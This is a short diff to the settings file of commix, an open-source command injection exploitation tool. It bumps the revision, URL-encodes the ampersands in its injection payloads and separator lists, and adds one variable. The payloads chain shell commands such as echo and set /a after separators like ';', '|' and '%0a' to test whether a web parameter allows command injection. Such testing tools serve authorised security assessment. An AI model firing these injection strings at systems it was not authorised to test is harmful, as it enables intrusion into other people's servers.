@@ -241,7 +241,7 @@ DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
 VERSION_NUM = "3.5"
-REVISION = "98"
+REVISION = "99"
 STABLE_RELEASE = False
 if STABLE_RELEASE:
   VERSION = "v" + VERSION_NUM + "-stable"
@@ -295,11 +295,11 @@ RAND_A = random.randint(1,10000)
 RAND_B = random.randint(1,10000)
 CALC_STRING = str(RAND_A) + "+" + str(RAND_B)
 BASIC_STRING = "(" + CALC_STRING + ")"
-BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + BASIC_STRING + ")&&echo $(" + BASIC_STRING + ")||echo $(" + BASIC_STRING + ")",
+BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + BASIC_STRING + ")%26%26echo $(" + BASIC_STRING + ")||echo $(" + BASIC_STRING + ")",
                                    "|set /a " + BASIC_STRING + "&set /a " + BASIC_STRING
                                    ]
 ALTER_SHELL_BASIC_STRING = " -c \"print(int(" + CALC_STRING + "))\""
-ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")&&echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")||echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")",
+ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")%26%26echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")||echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")",
                                    "|for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL + " &for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL
                                    ]
 BASIC_COMMAND_INJECTION_RESULT = str(RAND_A + RAND_B)
@@ -426,8 +426,8 @@ HTTP_HEADER = ""
 
 # The command injection separators.
 SEPARATORS = []
-DEFAULT_SEPARATORS = ["", ";", "&", "|"]
-SPECIAL_SEPARATORS = ["&&", "||", "%0a", "%0d%0a", "%1a"]
+DEFAULT_SEPARATORS = ["", ";", "%26", "|"]
+SPECIAL_SEPARATORS = ["%26%26", "||", "%0a", "%0d%0a", "%1a"]
 SEPARATORS_LVL1 = DEFAULT_SEPARATORS + SPECIAL_SEPARATORS  
 SEPARATORS_LVL3 = SEPARATORS_LVL2 = SEPARATORS_LVL1
 
@@ -1209,4 +1209,5 @@ FOLLOW_REDIRECT = False
 # Set predefined answers (e.g. "quit=N,follow=N").
 ANSWERS = ""
 
+CHECKING_PARAMETER = ""
 # eof
